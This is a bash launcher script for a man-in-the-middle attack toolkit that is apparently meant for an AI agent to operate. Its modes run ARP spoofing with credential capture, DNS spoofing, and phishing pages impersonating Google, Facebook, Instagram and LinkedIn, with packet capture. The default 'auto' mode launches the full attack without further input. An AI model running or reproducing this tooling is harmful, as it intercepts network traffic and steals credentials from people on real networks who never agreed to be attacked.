#!/bin/bash
# ============================================================
# run_mitm.sh - Single-entry MITM launcher for AI Agent
# Usage: ./run_mitm.sh [mode] [options]
# Modes: scan, arp, phish, full, cleanup, auto
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

MODE="${1:-auto}"
shift 2>/dev/null

show_help() {
    cat <<EOF
Usage: ./run_mitm.sh <mode> [options]

Modes:
  scan              - Scan network and show devices
  arp               - Basic ARP spoofing + credential capture
  phish <site>      - Phishing page + MITM (site: google|facebook|instagram|linkedin)
  full <site>       - Full: ARP + DNS spoof + phish + pcap
  cleanup           - Restore network to original state
  auto              - Auto detect and do full attack with Google phish

Examples:
  ./run_mitm.sh scan
  ./run_mitm.sh arp --auto -i eth0
  ./run_mitm.sh phish google --auto -i eth0
  ./run_mitm.sh full facebook --auto -i eth0
  ./run_mitm.sh cleanup
EOF
}

case "$MODE" in
    scan)
        echo "[*] Network Scan Mode"
        python3 "$SCRIPT_DIR/mitm_agent.py" --auto -i "${2:-eth0}" --no-sniff --quiet &
        PID=$!
        sleep 5
        kill $PID 2>/dev/null
        ;;

    arp)
        echo "[*] ARP Spoof + Credential Capture Mode"
        python3 "$SCRIPT_DIR/mitm_agent.py" "$@"
        ;;

    phish)
        SITE="${2:-google}"
        shift 2>/dev/null
        echo "[*] Phishing MITM Mode - Site: $SITE"
        python3 "$SCRIPT_DIR/phish_with_mitm.py" --site "$SITE" --dns-spoof all "$@"
        ;;

    full)
        SITE="${2:-google}"
        shift 2>/dev/null
        echo "[*] Full Attack Mode - Site: $SITE"
        python3 "$SCRIPT_DIR/phish_with_mitm.py" \
            --site "$SITE" \
            --dns-spoof all \
            --pcap \
            "$@"
        ;;

    cleanup)
        bash "$SCRIPT_DIR/cleanup_network.sh"
        ;;

    auto|*)
        echo "[*] Auto Mode - Full attack with Google phishing"
        python3 "$SCRIPT_DIR/phish_with_mitm.py" \
            --auto -i "${2:-eth0}" \
            --site google \
            --dns-spoof all \
            --pcap
        ;;
esac
